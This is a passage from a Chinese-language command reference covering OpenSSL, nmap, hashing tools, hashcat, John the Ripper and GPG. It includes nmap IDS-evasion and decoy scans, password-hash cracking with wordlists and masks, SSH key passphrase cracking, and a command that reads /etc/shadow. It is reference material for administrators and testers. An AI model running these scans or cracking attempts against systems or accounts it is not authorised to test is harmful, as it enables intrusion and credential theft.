# 编码字符串为 Base64
echo -n "hello world" | openssl base64
```

**基本写法：字符串解码**
`echo "<Base64>" | openssl base64 -d`
```bash
# 解码 Base64 字符串
echo "aGVsbG8gd29ybGQ=" | openssl base64 -d
```

---

## 加密通信测试

**基本写法：测试 TLS 连接**
`openssl s_client -connect <主机>:<端口>`
```bash
# 测试 HTTPS 连接
openssl s_client -connect example.com:443
```

**基本写法：指定 TLS 版本**
`openssl s_client -tls1_2 -connect <主机>:<端口>`
```bash
# 强制使用 TLS 1.2
openssl s_client -tls1_2 -connect example.com:443
```

**基本写法：查看证书链**
`openssl s_client -showcerts -connect <主机>:<端口>`
```bash
# 查看完整证书链
openssl s_client -showcerts -connect example.com:443
```

**基本写法：测试 SMTP TLS**
`openssl s_client -starttls smtp -connect <主机>:<端口>`
```bash
# 测试 SMTP 服务的 TLS
openssl s_client -starttls smtp -connect smtp.example.com:587
```

**基本写法：列出支持的密码套件**
`openssl ciphers -v`
```bash
# 列出所有支持的密码套件
openssl ciphers -v
```

**基本写法：测试特定密码套件**
`openssl s_client -cipher <密码套件> -connect <主机>:<端口>`
```bash
# 测试服务器是否支持特定密码套件
openssl s_client -cipher 'ECDHE-RSA-AES256-GCM-SHA384' -connect example.com:443
```

---

## 实用加密组合

**基本写法：加密大文件（混合加密）**
```bash
`# 1. 生成随机密钥
openssl rand -hex 32 > key.bin
# 2. 用 AES 加密文件
openssl enc -aes-256-cbc -salt -pbkdf2 -in largefile -out largefile.enc -pass file:./key.bin
# 3. 用 RSA 公钥加密密钥
openssl rsautl -encrypt -inkey public.key -pubin -in key.bin -out key.bin.enc
# 4. 删除原始密钥
rm key.bin`
```
```bash
# 混合加密大文件
openssl rand -hex 32 > key.bin
openssl enc -aes-256-cbc -salt -pbkdf2 -in largefile -out largefile.enc -pass file:./key.bin
openssl rsautl -encrypt -inkey public.key -pubin -in key.bin -out key.bin.enc
rm key.bin
```

**基本写法：解密大文件**
```bash
`# 1. 用 RSA 私钥解密密钥
openssl rsautl -decrypt -inkey private.key -in key.bin.enc -out key.bin
# 2. 用 AES 解密文件
openssl enc -d -aes-256-cbc -pbkdf2 -in largefile.enc -out largefile -pass file:./key.bin`
```
```bash
# 解密混合加密的大文件
openssl rsautl -decrypt -inkey private.key -in key.bin.enc -out key.bin
openssl enc -d -aes-256-cbc -pbkdf2 -in largefile.enc -out largefile -pass file:./key.bin
```

---

## 密钥派生

**基本写法：使用 PBKDF2 派生密钥**
`openssl kdf -keylen <长度> -kdfopts pass:<密码>:salt:<盐>:iter:<迭代次数> PBKDF2`
```bash
# 使用 PBKDF2 派生 32 字节密钥
openssl kdf -keylen 32 -kdfopts pass:password:salt:salt123:iter:100000 PBKDF2
```

**基本写法：使用 scrypt 派生密钥**
`openssl kdf -keylen <长度> -kdfopts pass:<密码> scrypt`
```bash
# 使用 scrypt 派生密钥
openssl kdf -keylen 32 -kdfopts pass:password scrypt
```



<!-- ============ 文档分隔线：033-cybersecurity/038-NmapScan.md ============ -->


## nmap 基本扫描

**基本写法：扫描单个主机**
`nmap <主机>`
```bash
# 扫描目标主机常用端口
nmap 192.168.1.1
```

**基本写法：扫描域名**
`nmap <域名>`
```bash
# 扫描域名
nmap example.com
```

**基本写法：扫描 IP 范围**
`nmap <起始IP>-<结束IP>`
```bash
# 扫描 IP 范围
nmap 192.168.1.1-100
```

**基本写法：扫描整个子网**
`nmap <网段>/<前缀>`
```bash
# 扫描 192.168.1.0/24 网段
nmap 192.168.1.0/24
```

**基本写法：从文件读取目标**
`nmap -iL <文件>`
```bash
# 从文件读取目标列表
nmap -iL targets.txt
```

---

## 主机发现

**基本写法：只发现存活主机**
`nmap -sn <目标>`
```bash
# Ping 扫描发现存活主机
nmap -sn 192.168.1.0/24
```

**基本写法：跳过主机发现**
`nmap -Pn <目标>`
```bash
# 跳过 Ping 直接扫描端口
nmap -Pn 192.168.1.1
```

**基本写法：使用 ARP 发现**
`nmap -PR <目标>`
```bash
# 使用 ARP 请求发现主机
nmap -PR 192.168.1.0/24
```

**基本写法：使用 ICMP 发现**
`nmap -PE <目标>`
```bash
# 使用 ICMP Echo 请求发现主机
nmap -PE 192.168.1.0/24
```

**基本写法：禁用 DNS 解析**
`nmap -n <目标>`
```bash
# 跳过 DNS 解析加快扫描
nmap -n 192.168.1.0/24
```

---

## 端口扫描技术

**基本写法：SYN 半开扫描**
`nmap -sS <目标>`
```bash
# SYN 半开扫描（需 root 权限）
nmap -sS 192.168.1.1
```

**基本写法：TCP 全连接扫描**
`nmap -sT <目标>`
```bash
# TCP 全连接扫描
nmap -sT 192.168.1.1
```

**基本写法：UDP 扫描**
`nmap -sU <目标>`
```bash
# UDP 端口扫描
nmap -sU 192.168.1.1
```

**基本写法：FIN 扫描**
`nmap -sF <目标>`
```bash
# FIN 扫描绕过防火墙
nmap -sF 192.168.1.1
```

**基本写法：Xmas 扫描**
`nmap -sX <目标>`
```bash
# Xmas 扫描（FIN+PSH+URG）
nmap -sX 192.168.1.1
```

**基本写法：Null 扫描**
`nmap -sN <目标>`
```bash
# Null 扫描（无标志位）
nmap -sN 192.168.1.1
```

---

## 端口指定

**基本写法：扫描指定端口**
`nmap -p <端口> <目标>`
```bash
# 扫描 80 端口
nmap -p 80 192.168.1.1
```

**基本写法：扫描多个端口**
`nmap -p <端口1>,<端口2> <目标>`
```bash
# 扫描 80 和 443 端口
nmap -p 80,443 192.168.1.1
```

**基本写法：扫描端口范围**
`nmap -p <起始>-<结束> <目标>`
```bash
# 扫描 1-1000 端口
nmap -p 1-1000 192.168.1.1
```

**基本写法：扫描所有端口**
`nmap -p- <目标>`
```bash
# 扫描所有 65535 个端口
nmap -p- 192.168.1.1
```

**基本写法：扫描常用端口**
`nmap -F <目标>`
```bash
# 快速扫描 100 个常用端口
nmap -F 192.168.1.1
```

**基本写法：扫描指定协议端口**
`nmap -p <协议>:<端口> <目标>`
```bash
# 扫描 TCP 80 和 UDP 53
nmap -p T:80,U:53 192.168.1.1
```

---

## 服务与版本探测

**基本写法：服务版本探测**
`nmap -sV <目标>`
```bash
# 探测端口运行的服务版本
nmap -sV 192.168.1.1
```

**基本写法：操作系统探测**
`nmap -O <目标>`
```bash
# 探测目标操作系统
nmap -O 192.168.1.1
```

**基本写法：全面扫描**
`nmap -A <目标>`
```bash
# 启用所有高级探测功能
nmap -A 192.168.1.1
```

**基本写法：设置版本探测强度**
`nmap -sV --version-intensity <级别> <目标>`
```bash
# 设置版本探测强度（0-9）
nmap -sV --version-intensity 9 192.168.1.1
```

**基本写法：轻量级版本探测**
`nmap -sV --version-light <目标>`
```bash
# 轻量级版本探测
nmap -sV --version-light 192.168.1.1
```

---

## 扫描时序与性能

**基本写法：设置时序模板**
`nmap -T<级别> <目标>`
```bash
# 使用 T4 时序模板（0-5）
nmap -T4 192.168.1.1
```

**基本写法：并行扫描**
`nmap --min-parallelism <数量> <目标>`
```bash
# 设置最小并行探测数
nmap --min-parallelism 10 192.168.1.1
```

**基本写法：限制扫描速率**
`nmap --max-rate <速率> <目标>`
```bash
# 限制每秒最大 100 个包
nmap --max-rate 100 192.168.1.1
```

**基本写法：设置超时**
`nmap --host-timeout <时间> <目标>`
```bash
# 设置每主机超时 30 分钟
nmap --host-timeout 30m 192.168.1.1
```

**基本写法：设置重试次数**
`nmap --max-retries <次数> <目标>`
```bash
# 设置最大重试次数
nmap --max-retries 2 192.168.1.1
```

---

## NSE 脚本引擎

**基本写法：使用默认脚本**
`nmap -sC <目标>`
```bash
# 使用默认脚本集合
nmap -sC 192.168.1.1
```

**基本写法：指定脚本扫描**
`nmap --script <脚本> <目标>`
```bash
# 使用 vuln 类脚本扫描漏洞
nmap --script vuln 192.168.1.1
```

**基本写法：使用多个脚本**
`nmap --script <脚本1>,<脚本2> <目标>`
```bash
# 同时使用多个脚本
nmap --script http-title,ssl-cert 192.168.1.1
```

**基本写法：HTTP 标题枚举**
`nmap --script http-title -p <端口> <目标>`
```bash
# 获取 HTTP 服务标题
nmap --script http-title -p 80,443 192.168.1.1
```

**基本写法：SSL 证书枚举**
`nmap --script ssl-cert -p 443 <目标>`
```bash
# 获取 SSL 证书信息
nmap --script ssl-cert -p 443 example.com
```

**基本写法：检测弱密码套件**
`nmap --script ssl-enum-ciphers -p 443 <目标>`
```bash
# 枚举 SSL 支持的密码套件
nmap --script ssl-enum-ciphers -p 443 example.com
```

**基本写法：脚本参数设置**
`nmap --script <脚本> --script-args <参数>=<值> <目标>`
```bash
# 给脚本传递参数
nmap --script http-enum --script-args http-enum.basepath=/admin/ -p 80 192.168.1.1
```

---

## 防火墙与 IDS 规避

**基本写法：分片发送数据包**
`nmap -f <目标>`
```bash
# 使用小分片绕过 IDS
nmap -f 192.168.1.1
```

**基本写法：设置 MTU**
`nmap --mtu <大小> <目标>`
```bash
# 设置自定义 MTU 大小
nmap --mtu 24 192.168.1.1
```

**基本写法：使用诱饵**
`nmap -D <诱饵1>,<诱饵2> <目标>`
```bash
# 使用诱饵 IP 隐藏真实源
nmap -D 192.168.1.100,192.168.1.101,ME 192.168.1.1
```

**基本写法：随机诱饵**
`nmap -D RND:<数量> <目标>`
```bash
# 使用 5 个随机诱饵
nmap -D RND:5 192.168.1.1
```

**基本写法：伪造源端口**
`nmap --source-port <端口> <目标>`
```bash
# 使用 53 端口作为源端口
nmap --source-port 53 192.168.1.1
```

**基本写法：随机化目标顺序**
`nmap --randomize-hosts <目标>`
```bash
# 随机化扫描顺序
nmap --randomize-hosts 192.168.1.0/24
```

---

## 输出格式

**基本写法：标准输出到文件**
`nmap -oN <文件> <目标>`
```bash
# 输出标准格式到文件
nmap -oN scan.txt 192.168.1.1
```

**基本写法：XML 格式输出**
`nmap -oX <文件> <目标>`
```bash
# 输出 XML 格式便于程序解析
nmap -oX scan.xml 192.168.1.1
```

**基本写法：Grep 格式输出**
`nmap -oG <文件> <目标>`
```bash
# 输出 grep 友好格式
nmap -oG scan.gnmap 192.168.1.1
```

**基本写法：输出所有格式**
`nmap -oA <文件名> <目标>`
```bash
# 同时输出所有格式
nmap -oA scanresult 192.168.1.1
```

**基本写法：追加到输出文件**
`nmap --append-output -oN <文件> <目标>`
```bash
# 追加结果到已有文件
nmap --append-output -oN scan.txt 192.168.1.2
```

---

## 实用扫描组合

**基本写法：快速发现存活主机**
`nmap -sn -T4 <网段>`
```bash
# 快速扫描网段存活主机
nmap -sn -T4 192.168.1.0/24
```

**基本写法：全面扫描单主机**
`nmap -sS -sV -O -A -T4 -p- <主机>`
```bash
# 全面扫描所有端口和服务
nmap -sS -sV -O -A -T4 -p- 192.168.1.1
```

**基本写法：扫描并保存结果**
`nmap -sV -oA <文件名> -p- <主机>`
```bash
# 扫描所有端口并保存结果
nmap -sV -oA fullscan -p- 192.168.1.1
```

**基本写法：隐蔽扫描**
`nmap -sS -f -T2 -D RND:3 --randomize-hosts <目标>`
```bash
# 慢速隐蔽扫描
nmap -sS -f -T2 -D RND:3 --randomize-hosts 192.168.1.1
```

**基本写法：扫描 Web 服务**
`nmap -p 80,443,8080,8443 -sV --script http-title,http-headers <目标>`
```bash
# 扫描常见 Web 端口并获取标题
nmap -p 80,443,8080,8443 -sV --script http-title,http-headers 192.168.1.1
```



<!-- ============ 文档分隔线：033-cybersecurity/039-HashTools.md ============ -->


## md5sum 哈希计算

**基本写法：计算文件 MD5**
`md5sum <文件>`
```bash
# 计算文件的 MD5 哈希
md5sum document.pdf
```

**基本写法：计算多个文件 MD5**
`md5sum <文件1> <文件2>`
```bash
# 计算多个文件的 MD5
md5sum file1.txt file2.txt file3.txt
```

**基本写法：保存哈希到文件**
`md5sum <文件> > <哈希文件>`
```bash
# 保存 MD5 哈希到文件
md5sum document.pdf > checksums.md5
```

**基本写法：验证文件 MD5**
`md5sum -c <哈希文件>`
```bash
# 验证文件 MD5 是否匹配
md5sum -c checksums.md5
```

**基本写法：计算字符串 MD5**
`echo -n "<字符串>" | md5sum`
```bash
# 计算字符串的 MD5
echo -n "hello world" | md5sum
```

---

## sha256sum 哈希计算

**基本写法：计算文件 SHA-256**
`sha256sum <文件>`
```bash
# 计算文件的 SHA-256 哈希
sha256sum document.pdf
```

**基本写法：保存 SHA-256 到文件**
`sha256sum <文件> > <哈希文件>`
```bash
# 保存 SHA-256 哈希到文件
sha256sum document.pdf > checksums.sha256
```

**基本写法：验证文件 SHA-256**
`sha256sum -c <哈希文件>`
```bash
# 验证文件 SHA-256 是否匹配
sha256sum -c checksums.sha256
```

**基本写法：计算字符串 SHA-256**
`echo -n "<字符串>" | sha256sum`
```bash
# 计算字符串的 SHA-256
echo -n "hello world" | sha256sum
```

**基本写法：批量验证**
`sha256sum -c <哈希文件> --quiet`
```bash
# 只显示验证失败的文件
sha256sum -c checksums.sha256 --quiet
```

---

## 其他哈希工具

**基本写法：计算 SHA-1**
`sha1sum <文件>`
```bash
# 计算文件的 SHA-1 哈希
sha1sum document.pdf
```

**基本写法：计算 SHA-512**
`sha512sum <文件>`
```bash
# 计算文件的 SHA-512 哈希
sha512sum document.pdf
```

**基本写法：计算 SHA-224**
`sha224sum <文件>`
```bash
# 计算文件的 SHA-224 哈希
sha224sum document.pdf
```

**基本写法：计算 SHA-384**
`sha384sum <文件>`
```bash
# 计算文件的 SHA-384 哈希
sha384sum document.pdf
```

---

## OpenSSL 哈希

**基本写法：使用 OpenSSL 计算 SHA-256**
`openssl dgst -sha256 <文件>`
```bash
# 使用 OpenSSL 计算 SHA-256
openssl dgst -sha256 document.pdf
```

**基本写法：使用 OpenSSL 计算 MD5**
`openssl dgst -md5 <文件>`
```bash
# 使用 OpenSSL 计算 MD5
openssl dgst -md5 document.pdf
```

**基本写法：使用 OpenSSL 计算 SHA-3**
`openssl dgst -sha3-256 <文件>`
```bash
# 使用 OpenSSL 计算 SHA3-256
openssl dgst -sha3-256 document.pdf
```

**基本写法：使用 OpenSSL 计算字符串哈希**
`echo -n "<字符串>" | openssl dgst -sha256`
```bash
# 计算字符串的 SHA-256
echo -n "hello world" | openssl dgst -sha256
```

---

## HMAC 计算

**基本写法：计算 HMAC-SHA256**
`openssl dgst -sha256 -hmac "<密钥>" <文件>`
```bash
# 计算 HMAC-SHA256
openssl dgst -sha256 -hmac "secret_key" document.pdf
```

**基本写法：使用十六进制密钥计算 HMAC**
`openssl dgst -sha256 -mac HMAC -macopt hexkey:<密钥> <文件>`
```bash
# 使用十六进制密钥计算 HMAC
openssl dgst -sha256 -mac HMAC -macopt hexkey:369bd7d655 document.pdf
```

**基本写法：计算字符串 HMAC**
`echo -n "<字符串>" | openssl dgst -sha256 -hmac "<密钥>"`
```bash
# 计算字符串的 HMAC-SHA256
echo -n "hello world" | openssl dgst -sha256 -hmac "secret_key"
```

---

## 哈希识别

**基本写法：识别哈希类型**
`hashid <哈希值>`
```bash
# 识别哈希值的类型
hashid 5d41402abc4b2a76b9719d911017c592
```

**基本写法：按长度识别**
```text
# 根据哈希长度判断算法
32 字符  -> MD5
40 字符  -> SHA1
56 字符  -> SHA224
64 字符  -> SHA256
96 字符  -> SHA384
128 字符 -> SHA512
```
```bash
# 常见哈希长度对照
echo "MD5: $(echo -n 'test' | md5sum | cut -d' ' -f1 | wc -c)"
echo "SHA256: $(echo -n 'test' | sha256sum | cut -d' ' -f1 | wc -c)"
```

**基本写法：识别密码哈希格式**
```text
# 常见密码哈希前缀
$2a$ / $2b$  -> bcrypt
$6$          -> SHA512crypt
$5$          -> SHA256crypt
$1$          -> MD5crypt
$y$          -> yescrypt
$argon2id$   -> Argon2id
```
```bash
# 查看 /etc/shadow 中的哈希格式
grep $USER /etc/shadow
```

---

## 文件完整性校验

**基本写法：生成校验文件**
`sha256sum <文件1> <文件2> > <校验文件>`
```bash
# 生成多个文件的校验文件
sha256sum file1.txt file2.txt file3.txt > checksums.sha256
```

**基本写法：验证文件完整性**
`sha256sum -c <校验文件>`
```bash
# 验证所有文件的完整性
sha256sum -c checksums.sha256
```

**基本写法：递归计算目录哈希**
`find <目录> -type f -exec sha256sum {} + > <校验文件>`
```bash
# 递归计算目录下所有文件的 SHA-256
find /important/data -type f -exec sha256sum {} + > checksums.sha256
```

**基本写法：只显示验证失败的文件**
`sha256sum -c <校验文件> --quiet`
```bash
# 静默模式只显示失败的验证
sha256sum -c checksums.sha256 --quiet
```

**基本写法：严格模式验证**
`sha256sum -c <校验文件> --strict`
```bash
# 严格模式遇到错误返回非零退出码
sha256sum -c checksums.sha256 --strict
```

---

## bcrypt 密码哈希

**基本写法：使用 Python 生成 bcrypt 哈希**
`python3 -c "import bcrypt; print(bcrypt.hashpw(b'<密码>', bcrypt.gensalt()).decode())"`
```bash
# 生成 bcrypt 密码哈希
python3 -c "import bcrypt; print(bcrypt.hashpw(b'mypassword', bcrypt.gensalt(12)).decode())"
```

**基本写法：验证 bcrypt 密码**
`python3 -c "import bcrypt; print(bcrypt.checkpw(b'<密码>', b'<哈希>'))"`
```bash
# 验证 bcrypt 密码
python3 -c "import bcrypt; print(bcrypt.checkpw(b'mypassword', b'\$2b\$12\$...'))"
```

**基本写法：使用 htpasswd 生成 bcrypt**
`htpasswd -nbB <用户> <密码>`
```bash
# 使用 Apache htpasswd 生成 bcrypt 哈希
htpasswd -nbB admin secret123
```

---

## PBKDF2 密钥派生

**基本写法：使用 OpenSSL PBKDF2**
`openssl kdf -keylen <长度> -kdfopts pass:<密码>:salt:<盐>:iter:<迭代次数> PBKDF2`
```bash
# 使用 PBKDF2 派生 32 字节密钥
openssl kdf -keylen 32 -kdfopts pass:password:salt:salt:iter:600000 PBKDF2
```

**基本写法：使用 Python PBKDF2**
`python3 -c "import hashlib, binascii; print(binascii.hexlify(hashlib.pbkdf2_hmac('sha256', b'<密码>', b'<盐>', <迭代次数>)).decode())"`
```bash
# 使用 Python 计算 PBKDF2
python3 -c "import hashlib, binascii; print(binascii.hexlify(hashlib.pbkdf2_hmac('sha256', b'password', b'salt', 600000)).decode())"
```

---

## 实用哈希组合

**基本写法：比较两个文件是否相同**
`sha256sum <文件1> <文件2> | cut -d' ' -f1 | uniq -d`
```bash
# 比较两个文件的哈希是否相同
sha256sum file1.txt file2.txt
```

**基本写法：批量检查文件变更**
`sha256sum -c <校验文件> --quiet && echo "文件无变更" || echo "文件已变更"`
```bash
# 检查文件是否被篡改
sha256sum -c checksums.sha256 --quiet && echo "文件无变更" || echo "文件已变更"
```

**基本写法：生成文件指纹**
`sha256sum <文件> | cut -d' ' -f1`
```bash
# 只输出哈希值
sha256sum document.pdf | cut -d' ' -f1
```



<!-- ============ 文档分隔线：033-cybersecurity/040-Hashcat.md ============ -->


## hashcat 基本用法

**基本写法：字典攻击**
`hashcat -m <模式> <哈希文件> <字典>`
```bash
# 使用字典破解 MD5 哈希
hashcat -m 0 hashes.txt rockyou.txt
```

**基本写法：指定哈希模式**
`hashcat -m <模式> <哈希> <字典>`
```bash
# 破解 SHA-256 哈希
hashcat -m 1400 sha256hashes.txt rockyou.txt
```

**基本写法：显示破解结果**
`hashcat -m <模式> <哈希文件> <字典> --show`
```bash
# 显示已破解的哈希和明文
hashcat -m 0 hashes.txt --show
```

**基本写法：指定攻击模式**
`hashcat -a <模式> -m <哈希模式> <哈希文件> [参数]`
```bash
# 使用攻击模式 0（字典攻击）
hashcat -a 0 -m 0 hashes.txt rockyou.txt
```

---

## 哈希模式

**基本写法：常见哈希模式**
```text
`0     - MD5
100   - SHA1
1400  - SHA256
1700  - SHA512
1000  - NTLM
1800  - sha512crypt ($6$)
500   - md5crypt ($1$)
3200  - bcrypt ($2a$/$2b$)`
```
```bash
# 查看所有支持的哈希模式
hashcat --help | grep -i "hash-type"
```

**基本写法：查看所有哈希模式**
`hashcat --help`
```bash
# 列出所有支持的哈希类型
hashcat --help
```

**基本写法：破解 NTLM 哈希**
`hashcat -m 1000 <哈希文件> <字典>`
```bash
# 破解 Windows NTLM 哈希
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

**基本写法：破解 bcrypt 哈希**
`hashcat -m 3200 <哈希文件> <字典>`
```bash
# 破解 bcrypt 哈希（速度较慢）
hashcat -m 3200 bcrypt_hashes.txt rockyou.txt
```

---

## 攻击模式

**基本写法：字典攻击（模式 0）**
`hashcat -a 0 -m <模式> <哈希文件> <字典>`
```bash
# 标准字典攻击
hashcat -a 0 -m 0 hashes.txt rockyou.txt
```

**基本写法：组合字典攻击（模式 1）**
`hashcat -a 1 -m <模式> <哈希文件> <字典1> <字典2>`
```bash
# 组合两个字典
hashcat -a 1 -m 0 hashes.txt dict1.txt dict2.txt
```

**基本写法：掩码暴力破解（模式 3）**
`hashcat -a 3 -m <模式> <哈希文件> <掩码>`
```bash
# 暴力破解 8 位数字密码
hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d?d?d
```

**基本写法：基于规则的攻击（模式 6）**
`hashcat -a 6 -m <模式> <哈希文件> <字典> <掩码>`
```bash
# 字典 + 掩码组合攻击
hashcat -a 6 -m 0 hashes.txt rockyou.txt ?d?d?d?d
```

**基本写法：混合攻击（模式 7）**
`hashcat -a 7 -m <模式> <哈希文件> <掩码> <字典>`
```bash
# 掩码 + 字典组合攻击
hashcat -a 7 -m 0 hashes.txt ?d?d?d?d rockyou.txt
```

---

## 掩码字符集

**基本写法：内置字符集**
```text
`?l - 小写字母 a-z
?u - 大写字母 A-Z
?d - 数字 0-9
?s - 特殊字符
?a - 所有字符
?b - 二进制
?h - 十六进制小写
?H - 十六进制大写`
```
```bash
# 查看掩码字符集说明
hashcat --help | grep "Built-in"
```

**基本写法：自定义字符集**
`hashcat -<数字> <字符集> -a 3 -m <模式> <哈希文件> <掩码>`
```bash
# 自定义字符集只包含 abc123
hashcat -1 abc123 -a 3 -m 0 hashes.txt ?1?1?1?1?1
```

**基本写法：常见密码模式**
```bash
`# 8 位数字密码
?d?d?d?d?d?d?d?d
# 6-8 位小写字母
?l?l?l?l?l?l?l?l
# 大写开头 + 小写 + 数字
?u?l?l?l?l?d?d`
```
```bash
# 8 位小写字母密码
hashcat -a 3 -m 0 hashes.txt ?l?l?l?l?l?l?l?l
```

---

## 规则文件

**基本写法：使用规则文件**
`hashcat -m <模式> <哈希文件> <字典> -r <规则文件>`
```bash
# 使用最佳 64 规则
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**基本写法：组合多个规则**
`hashcat -m <模式> <哈希文件> <字典> -r <规则1> -r <规则2>`
```bash
# 组合多个规则文件
hashcat -m 0 hashes.txt rockyou.txt -r rules1.rule -r rules2.rule
```

**基本写法：常用规则文件**
```bash
`/usr/share/hashcat/rules/best64.rule
/usr/share/hashcat/rules/rockyou-30000.rule
/usr/share/hashcat/rules/d3ad0ne.rule
/usr/share/hashcat/rules/toggles5.rule`
```
```bash
# 使用 rockyou-30000 规则
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

---

## 性能优化

**基本写法：指定工作负载**
`hashcat -w <级别> -m <模式> <哈希文件> <字典>`
```bash
# 设置工作负载为高（1-4）
hashcat -w 3 -m 0 hashes.txt rockyou.txt
```

**基本写法：指定设备类型**
`hashcat -D <设备> -m <模式> <哈希文件> <字典>`
```bash
# 使用 GPU 设备
hashcat -D 2 -m 0 hashes.txt rockyou.txt
```

**基本写法：显示性能测试**
`hashcat -b -m <模式>`
```bash
# 性能基准测试
hashcat -b -m 0
```

**基本写法：限制 GPU 速度**
`hashcat --gpu-temp-abort=<温度> -m <模式> <哈希文件> <字典>`
```bash
# GPU 温度超过 90 度时停止
hashcat --gpu-temp-abort=90 -m 0 hashes.txt rockyou.txt
```

**基本写法：启用优化内核**
`hashcat -O -m <模式> <哈希文件> <字典>`
```bash
# 启用优化内核提升性能
hashcat -O -m 0 hashes.txt rockyou.txt
```

---

## 会话管理

**基本写法：恢复会话**
`hashcat --session <名称> --restore`
```bash
# 恢复之前的破解会话
hashcat --session mysession --restore
```

**基本写法：指定会话名称**
`hashcat --session <名称> -m <模式> <哈希文件> <字典>`
```bash
# 启动命名会话
hashcat --session mysession -m 0 hashes.txt rockyou.txt
```

**基本写法：自动恢复**
`hashcat --restore`
```bash
# 恢复最近的会话
hashcat --restore
```

---

## 输出与结果

**基本写法：查看破解结果**
`hashcat -m <模式> <哈希文件> --show`
```bash
# 显示已破解的哈希
hashcat -m 0 hashes.txt --show
```

**基本写法：输出到文件**
`hashcat -m <模式> <哈希文件> <字典> -o <输出文件>`
```bash
# 将破解结果保存到文件
hashcat -m 0 hashes.txt rockyou.txt -o cracked.txt
```

**基本写法：输出格式化**
`hashcat -m <模式> <哈希文件> <字典> -o <输出文件> --outfile-format <格式>`
```bash
# 指定输出格式（2 = 哈希:明文）
hashcat -m 0 hashes.txt rockyou.txt -o cracked.txt --outfile-format 2
```

**基本写法：显示状态**
`hashcat -m <模式> <哈希文件> <字典> --status`
```bash
# 自动显示状态更新
hashcat -m 0 hashes.txt rockyou.txt --status
```

---

## 字典处理

**基本写法：使用多个字典**
`cat <字典1> <字典2> > <合并字典>`
```bash
# 合并多个字典文件
cat dict1.txt dict2.txt dict3.txt > combined.txt
hashcat -m 0 hashes.txt combined.txt
```

**基本写法：从字典文件读取**
`hashcat -m <模式> <哈希文件> <字典>`
```bash
# 使用 rockyou 字典
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**基本写法：解压 rockyou 字典**
`gunzip /usr/share/wordlists/rockyou.txt.gz`
```bash
# 解压 rockyou 字典文件
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 实用破解组合

**基本写法：常见密码模式破解**
`hashcat -a 3 -m <模式> <哈希文件> ?d?d?d?d?d?d?d?d`
```bash
# 破解 8 位数字密码
hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d?d?d
```

**基本写法：字典 + 规则破解**
`hashcat -m <模式> <哈希文件> <字典> -r <规则>`
```bash
# 字典 + 规则组合攻击
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**基本写法：渐进式破解**
```bash
`# 1. 先用常用字典
hashcat -m 0 hashes.txt rockyou.txt
# 2. 再用规则扩展
hashcat -m 0 hashes.txt rockyou.txt -r best64.rule
# 3. 最后暴力破解
hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a`
```
```bash
# 渐进式破解策略
hashcat -m 0 hashes.txt rockyou.txt
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a
```

---

## John the Ripper 替代

**基本写法：破解哈希文件**
`john --wordlist=<字典> <哈希文件>`
```bash
# 使用 John the Ripper 破解
john --wordlist=rockyou.txt hashes.txt
```

**基本写法：显示破解结果**
`john --show <哈希文件>`
```bash
# 显示已破解的密码
john --show hashes.txt
```

**基本写法：指定哈希格式**
`john --format=<格式> --wordlist=<字典> <哈希文件>`
```bash
# 指定 MD5 格式破解
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
```

**基本写法：破解 SSH 密钥密码**
`ssh2john <密钥> > <哈希文件>; john <哈希文件>`
```bash
# 破解 SSH 私钥密码
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt
```



<!-- ============ 文档分隔线：033-cybersecurity/041-GPGEncrypt.md ============ -->


## GPG 密钥生成

**基本写法：生成 GPG 密钥对**
`gpg --generate-key`
```bash
# 交互式生成 GPG 密钥对
gpg --generate-key
```

**基本写法：完全交互式生成**
`gpg --full-generate-key`
```bash
# 完整选项生成密钥
gpg --full-generate-key
```

**基本写法：快速生成密钥**
`gpg --quick-generate-key <用户ID>`
```bash
# 快速生成密钥
gpg --quick-generate-key "user@example.com"
```

**基本写法：指定算法生成**
`gpg --full-generate-key --expert`
```bash
# 专家模式选择算法
gpg --full-generate-key --expert
```

---

## 密钥管理

**基本写法：列出公钥**
`gpg --list-keys`
```bash
# 列出所有公钥
gpg --list-keys
```

**基本写法：列出私钥**
`gpg --list-secret-keys`
```bash
# 列出所有私钥
gpg --list-secret-keys
```

**基本写法：列出密钥指纹**
`gpg --fingerprint <用户ID>`
```bash
# 查看密钥指纹
gpg --fingerprint user@example.com
```

**基本写法：导出公钥**
`gpg --export -a <用户ID> > <文件>`
```bash
# 导出 ASCII 格式公钥
gpg --export -a user@example.com > public.key
```

**基本写法：导出私钥**
`gpg --export-secret-keys -a <用户ID> > <文件>`
```bash
# 导出 ASCII 格式私钥
gpg --export-secret-keys -a user@example.com > private.key
```

**基本写法：导入密钥**
`gpg --import <文件>`
```bash
# 导入 GPG 密钥
gpg --import public.key
```

**基本写法：删除公钥**
`gpg --delete-keys <用户ID>`
```bash
# 删除公钥
gpg --delete-keys user@example.com
```

**基本写法：删除私钥**
`gpg --delete-secret-keys <用户ID>`
```bash
# 删除私钥
gpg --delete-secret-keys user@example.com
```

---

## 文件加密

**基本写法：对称加密文件**
`gpg -c <文件>`
```bash
# 使用密码对称加密文件
gpg -c secret.txt
```

**基本写法：使用公钥加密**
`gpg -e -r <接收者> <文件>`
```bash
# 使用接收者公钥加密
gpg -e -r user@example.com secret.txt
```

**基本写法：签名并加密**
`gpg -e -s -r <接收者> <文件>`
```bash
# 签名并加密文件
gpg -e -s -r user@example.com secret.txt
```

**基本写法：指定输出文件**
`gpg -o <输出文件> -e -r <接收者> <文件>`
```bash
# 指定输出文件名
gpg -o encrypted.gpg -e -r user@example.com secret.txt
```

**基本写法：加密为 ASCII 格式**
`gpg -a -e -r <接收者> <文件>`
```bash
# 输出 ASCII 装甲格式
gpg -a -e -r user@example.com secret.txt
```

---

## 文件解密

**基本写法：解密文件**
`gpg -d <文件>`
```bash
# 解密 GPG 文件
gpg -d secret.txt.gpg
```

**基本写法：解密到指定文件**
